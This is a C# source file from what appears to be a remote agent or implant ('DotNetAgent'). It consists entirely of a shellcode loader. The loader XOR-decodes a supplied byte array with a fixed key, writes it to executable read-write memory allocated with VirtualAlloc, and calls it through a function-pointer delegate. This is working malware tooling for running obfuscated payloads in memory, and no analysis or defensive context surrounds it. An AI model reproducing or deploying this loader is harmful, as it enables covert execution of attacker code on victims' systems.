using System;
using System.Runtime.InteropServices;

namespace DotNetAgent
{
    internal class PluginExecution
    {
        private const uint MEM_COMMIT = 0x1000;
        private const uint MEM_RESERVE = 0x2000;
        private const uint PAGE_EXECUTE_READWRITE = 0x40;
        private const uint MEM_RELEASE = 0x8000;
        private const byte XOR_DECODE_KEY = 0x55;

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool VirtualFree(IntPtr lpAddress, uint dwSize, uint dwFreeType);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate void ShellcodeDelegate();

        public static void ExecuteAsShellcode(byte[] plugin)
        {
            for (int x = 0; x < plugin.Length; x++)
                plugin[x] ^= XOR_DECODE_KEY;
            IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)plugin.Length, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (addr == IntPtr.Zero)
                throw new InvalidOperationException("VirtualAlloc failed");
            try
            {
                Marshal.Copy(plugin, 0, addr, plugin.Length);
                ShellcodeDelegate shellcode = (ShellcodeDelegate)Marshal.GetDelegateForFunctionPointer(addr, typeof(ShellcodeDelegate));
                shellcode();
            }
            finally
            {
                VirtualFree(addr, 0, MEM_RELEASE);
            }
        }
    }
}
